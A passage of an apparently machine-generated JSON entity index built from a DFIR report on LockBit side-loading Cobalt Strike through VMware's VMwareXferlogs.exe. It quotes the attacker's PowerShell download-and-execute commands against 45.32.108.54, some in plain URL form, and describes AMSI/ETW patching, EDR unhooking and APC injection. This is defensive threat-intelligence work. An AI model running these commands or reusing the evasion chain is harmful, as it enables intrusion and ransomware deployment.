                    "id": "<UNKNOWNWORD_0x27310be>",
                    "type": "UnknownWord",
                    "value": "antimalware"
                },
                "references": {
                    "sentences": [
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI)."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xf2b02acc>",
                    "type": "UnknownWord",
                    "value": "amsi"
                },
                "references": {
                    "sentences": [
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon.",
                        "AMSI is bypassed the same way as ETW through patching AmsiScanBuffer. This halts AMSI from inspecting potentially suspicious buffers within this process.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI).",
                        "AMSI bypass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xfa378dc1>",
                    "type": "UnknownWord",
                    "value": "employing"
                },
                "references": {
                    "sentences": [
                        "LockBit is a Ransomware as a Service (RaaS) operation that has been active since 2019 (previously known as ABCD). It commonly leverages the double extortion technique, employing tools such as StealBit, WinSCP, and cloud-based backup solutions for data exfiltration prior to deploying the ransomware. Like most ransomware groups, LockBits post-exploitation tool of choice is Cobalt Strike."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xc9d21476>",
                    "type": "UnknownWord",
                    "value": "winscp"
                },
                "references": {
                    "sentences": [
                        "LockBit is a Ransomware as a Service (RaaS) operation that has been active since 2019 (previously known as ABCD). It commonly leverages the double extortion technique, employing tools such as StealBit, WinSCP, and cloud-based backup solutions for data exfiltration prior to deploying the ransomware. Like most ransomware groups, LockBits post-exploitation tool of choice is Cobalt Strike."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xf0638ce5>",
                    "type": "UnknownWord",
                    "value": "cloud-based"
                },
                "references": {
                    "sentences": [
                        "LockBit is a Ransomware as a Service (RaaS) operation that has been active since 2019 (previously known as ABCD). It commonly leverages the double extortion technique, employing tools such as StealBit, WinSCP, and cloud-based backup solutions for data exfiltration prior to deploying the ransomware. Like most ransomware groups, LockBits post-exploitation tool of choice is Cobalt Strike."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xe262d326>",
                    "type": "UnknownWord",
                    "value": "side-load"
                },
                "references": {
                    "sentences": [
                        "During a recent investigation, our DFIR team discovered an interesting technique used by LockBit Ransomware Group to load a Cobalt Strike Beacon Reflective Loader. In this particular case, LockBit managed to side-load Cobalt Strike Beacon through a signed VMware xfer logs command line utility."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xd03ce4c1>",
                    "type": "UnknownWord",
                    "value": "dll-hijacking"
                },
                "references": {
                    "sentences": [
                        "Side-loading is a DLL-hijacking technique used to trick a benign process into loading and executing a malicious DLL by placing the DLL alongside the process corresponding EXE, taking advantage of the DLL search order. In this instance, the threat actor used PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader. The VMware utility was then executed via cmd.exe, passing control flow to the malicious DLL."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xd6979f88>",
                    "type": "UnknownWord",
                    "value": "placing"
                },
                "references": {
                    "sentences": [
                        "Side-loading is a DLL-hijacking technique used to trick a benign process into loading and executing a malicious DLL by placing the DLL alongside the process corresponding EXE, taking advantage of the DLL search order. In this instance, the threat actor used PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader. The VMware utility was then executed via cmd.exe, passing control flow to the malicious DLL."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x5188f1dc>",
                    "type": "UnknownWord",
                    "value": "proceeded"
                },
                "references": {
                    "sentences": [
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xb00e09f6>",
                    "type": "UnknownWord",
                    "value": "rc4"
                },
                "references": {
                    "sentences": [
                        "RC4 Key Scheduling Algorithm",
                        "Once these defenses have been bypassed, the malware proceeds to execute the final payload. The final payload is a Cobalt Strike Beacon Reflective Loader that is stored RC4-encrypted in the previously mentioned c0000015.log file. The RC4 Key Scheduling Algorithm can be seen below with the hardcoded 136 byte key.",
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon.",
                        "A handful of samples related to the malicious DLL were discovered by our investigation. The only notable differences being the RC4 key and name of the file containing the RC4-encrypted payload to decrypt.",
                        "RC4 decryption routine",
                        "The RC4 decryption of the payload then commences."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xd22a6488>",
                    "type": "UnknownWord",
                    "value": "apc"
                },
                "references": {
                    "sentences": [
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon.",
                        "Logic to queue and execute user-mode APC",
                        "This thread is created in a suspended state, allowing the malware to add a user-mode APC, pointing to the payload, to the newly created threads APC queue. Finally, the thread is resumed, allowing the thread to run and execute the Cobalt Strike payload via the APC."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xcbe62120>",
                    "type": "UnknownWord",
                    "value": "queued"
                },
                "references": {
                    "sentences": [
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xfe4a4d24>",
                    "type": "UnknownWord",
                    "value": "beacon"
                },
                "references": {
                    "sentences": [
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x3006330>",
                    "type": "UnknownWord",
                    "value": "vmwarexferlogs"
                },
                "references": {
                    "sentences": [
                        "The attack chain began with several PowerShell commands executed by the threat actor to download three components, a malicious DLL, a signed VMwareXferlogs executable, and an encrypted Cobalt Strike payload in the form of a .log file."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x58349638>",
                    "type": "UnknownWord",
                    "value": "cmdlets"
                },
                "references": {
                    "sentences": [
                        "Our DFIR team recovered the complete PowerShell cmdlets used to download the components from forensic artifacts."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xeaba6949>",
                    "type": "UnknownWord",
                    "value": "invoke-webrequest"
                },
                "references": {
                    "sentences": [
                        "Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\\windows\\debug\\glib-2.0.dll;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile c:\\windows\\debug\\c0000015.log;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\\windows\\debug\\VMwareXferlogs.exe;c:\\windows\\debug\\VMwareXferlogs.exe"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<URL_0xb9535c54>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/glib-2.0.dll"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeaba6949>",
                            "type": "UnknownWord",
                            "value": "invoke-webrequest"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x38d0223e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeaba6949>",
                            "type": "UnknownWord",
                            "value": "invoke-webrequest"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x95aa446f>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe;c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeaba6949>",
                            "type": "UnknownWord",
                            "value": "invoke-webrequest"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x40a8dd40>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeaba6949>",
                            "type": "UnknownWord",
                            "value": "invoke-webrequest"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x1f36c135>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeaba6949>",
                            "type": "UnknownWord",
                            "value": "invoke-webrequest"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xfa8a332e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/c0000015.log"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeaba6949>",
                            "type": "UnknownWord",
                            "value": "invoke-webrequest"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x69e2e8a>",
                    "type": "UnknownWord",
                    "value": "-uri"
                },
                "references": {
                    "sentences": [
                        "Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\\windows\\debug\\glib-2.0.dll;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile c:\\windows\\debug\\c0000015.log;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\\windows\\debug\\VMwareXferlogs.exe;c:\\windows\\debug\\VMwareXferlogs.exe"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<URL_0xb9535c54>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/glib-2.0.dll"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x69e2e8a>",
                            "type": "UnknownWord",
                            "value": "-uri"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xfa8a332e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/c0000015.log"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x69e2e8a>",
                            "type": "UnknownWord",
                            "value": "-uri"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x38d0223e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x69e2e8a>",
                            "type": "UnknownWord",
                            "value": "-uri"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x40a8dd40>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x69e2e8a>",
                            "type": "UnknownWord",
                            "value": "-uri"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x1f36c135>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x69e2e8a>",
                            "type": "UnknownWord",
                            "value": "-uri"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x95aa446f>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe;c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x69e2e8a>",
                            "type": "UnknownWord",
                            "value": "-uri"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                    "type": "UnknownWord",
                    "value": "-outfile"
                },
                "references": {
                    "sentences": [
                        "Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\\windows\\debug\\glib-2.0.dll;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile c:\\windows\\debug\\c0000015.log;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\\windows\\debug\\VMwareXferlogs.exe;c:\\windows\\debug\\VMwareXferlogs.exe"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<PATH_0x40a8dd40>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xfa8a332e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/c0000015.log"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x95aa446f>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe;c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xb9535c54>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/glib-2.0.dll"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x1f36c135>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x38d0223e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x4b1ae79>",
                    "type": "UnknownWord",
                    "value": "1>"
                },
                "references": {
                    "sentences": [
                        "c:\\windows\\debug\\VMwareXferlogs.exe 1><crlf>\\\\127.0.0.1\\ADMIN$\\__1649832485.0836577 2>&1"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<PATH_0x9cbc3e27>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x4b1ae79>",
                            "type": "UnknownWord",
                            "value": "1>"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xea324de5>",
                    "type": "UnknownWord",
                    "value": "__1649832485"
                },
                "references": {
                    "sentences": [
                        "c:\\windows\\debug\\VMwareXferlogs.exe 1><crlf>\\\\127.0.0.1\\ADMIN$\\__1649832485.0836577 2>&1"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x2d6bc2da>",
                    "type": "UnknownWord",
                    "value": "2>"
                },
                "references": {
                    "sentences": [
                        "c:\\windows\\debug\\VMwareXferlogs.exe 1><crlf>\\\\127.0.0.1\\ADMIN$\\__1649832485.0836577 2>&1"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x6707c47a>",
                    "type": "UnknownWord",
                    "value": "vmware xfer"
                },
                "references": {
                    "sentences": [
                        "VMware xfer utility command line usage"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x7062c79d>",
                    "type": "UnknownWord",
                    "value": "party"
                },
                "references": {
                    "sentences": [
                        "This command line utility makes several calls to a third party library called glib-2.0.dll. Both the utility and a legitimate version of glib-2.0.dll are shipped with VMware installations."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x7062c79d>",
                            "type": "UnknownWord",
                            "value": "party"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x7a672a58>",
                    "type": "UnknownWord",
                    "value": "shipped"
                },
                "references": {
                    "sentences": [
                        "This command line utility makes several calls to a third party library called glib-2.0.dll. Both the utility and a legitimate version of glib-2.0.dll are shipped with VMware installations."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x7a672a58>",
                            "type": "UnknownWord",
                            "value": "shipped"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x41cfb030>",
                    "type": "UnknownWord",
                    "value": "imported"
                },
                "references": {
                    "sentences": [
                        "The weaponized glib-2.0.dll downloaded by the threat actor exports all the necessary functions imported by VMwareXferlog.exe.",
                        "glib-2.0.dll-related functions imported by VMwareXferlog.exe"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x41cfb030>",
                            "type": "UnknownWord",
                            "value": "imported"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x41cfb030>",
                            "type": "UnknownWord",
                            "value": "imported"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x148d8b4e>",
                    "type": "UnknownWord",
                    "value": "glib-2"
                },
                "references": {
                    "sentences": [
                        "glib-2.0.dll-related functions imported by VMwareXferlog.exe"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x148d8b4e>",
                            "type": "UnknownWord",
                            "value": "glib-2"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x92d9e3cc>",
                    "type": "UnknownWord",
                    "value": "dll-related"
                },
                "references": {
                    "sentences": [
                        "glib-2.0.dll-related functions imported by VMwareXferlog.exe"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x92d9e3cc>",
                            "type": "UnknownWord",
                            "value": "dll-related"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x3efc9ad7>",
                    "type": "UnknownWord",
                    "value": "g_path_get_basename"
                },
                "references": {
                    "sentences": [
                        "On the other hand, g_path_get_basename() invokes the malicious payload prior to exiting.",
                        "g_path_get_basename() being called in the main() function",
                        "Calls to exported functions from glib-2.0.dll are made within the main function of the VMware utility, the first being g_path_get_basename().",
                        "Note that the virtual addresses for the exported functions are all the same for the weaponized glib-2.0.dll (0x1800020d0), except for g_path_get_basename, which has a virtual address of 0x180002420. This is due to the fact that all exports, except for the g_path_get_basename function do nothing other than call ExitProcess().",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x3efc9ad7>",
                            "type": "UnknownWord",
                            "value": "g_path_get_basename"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x6eb30b3e>",
                    "type": "UnknownWord",
                    "value": "exitprocess"
                },
                "references": {
                    "sentences": [
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.",
                        "Note that the virtual addresses for the exported functions are all the same for the weaponized glib-2.0.dll (0x1800020d0), except for g_path_get_basename, which has a virtual address of 0x180002420. This is due to the fact that all exports, except for the g_path_get_basename function do nothing other than call ExitProcess()."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x6eb30b3e>",
                            "type": "UnknownWord",
                            "value": "exitprocess"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xb1ee8281>",
                    "type": "UnknownWord",
                    "value": "g_error_free"
                },
                "references": {
                    "sentences": [
                        "g_error_free() functions logic"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x70774f8b>",
                    "type": "UnknownWord",
                    "value": "exiting"
                },
                "references": {
                    "sentences": [
                        "On the other hand, g_path_get_basename() invokes the malicious payload prior to exiting."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x740f4a89>",
                    "type": "UnknownWord",
                    "value": "completing"
                },
                "references": {
                    "sentences": [
                        "When VMwareXferlog.exe calls this function, control flow is transferred to the malicious glib-2.0.dll, rather than the legitimate one, completing the side-loading attack."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x740f4a89>",
                            "type": "UnknownWord",
                            "value": "completing"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x740f4a89>",
                            "type": "UnknownWord",
                            "value": "completing"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xd04412ad>",
                    "type": "UnknownWord",
                    "value": "querying"
                },
                "references": {
                    "sentences": [
                        "Once control flow is passed to the weaponized DLL, the presence of a debugger is checked by querying the BeingDebugged flag and NtGlobalFlag in the Process Environment Block (PEB). If a debugger is detected, the malware enters an endless loop."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x5f1ab148>",
                    "type": "UnknownWord",
                    "value": "beingdebugged"
                },
                "references": {
                    "sentences": [
                        "Once control flow is passed to the weaponized DLL, the presence of a debugger is checked by querying the BeingDebugged flag and NtGlobalFlag in the Process Environment Block (PEB). If a debugger is detected, the malware enters an endless loop."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x9747deac>",
                    "type": "UnknownWord",
                    "value": "ntglobalflag"
                },
                "references": {
                    "sentences": [
                        "Once control flow is passed to the weaponized DLL, the presence of a debugger is checked by querying the BeingDebugged flag and NtGlobalFlag in the Process Environment Block (PEB). If a debugger is detected, the malware enters an endless loop."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xf9ccb8cf>",
                    "type": "UnknownWord",
                    "value": "peb"
                },
                "references": {
                    "sentences": [
                        "Once control flow is passed to the weaponized DLL, the presence of a debugger is checked by querying the BeingDebugged flag and NtGlobalFlag in the Process Environment Block (PEB). If a debugger is detected, the malware enters an endless loop."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xaebf235a>",
                    "type": "UnknownWord",
                    "value": "endless"
                },
                "references": {
                    "sentences": [
                        "Once control flow is passed to the weaponized DLL, the presence of a debugger is checked by querying the BeingDebugged flag and NtGlobalFlag in the Process Environment Block (PEB). If a debugger is detected, the malware enters an endless loop."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xfa6e7cb5>",
                    "type": "UnknownWord",
                    "value": "epp"
                },
                "references": {
                    "sentences": [
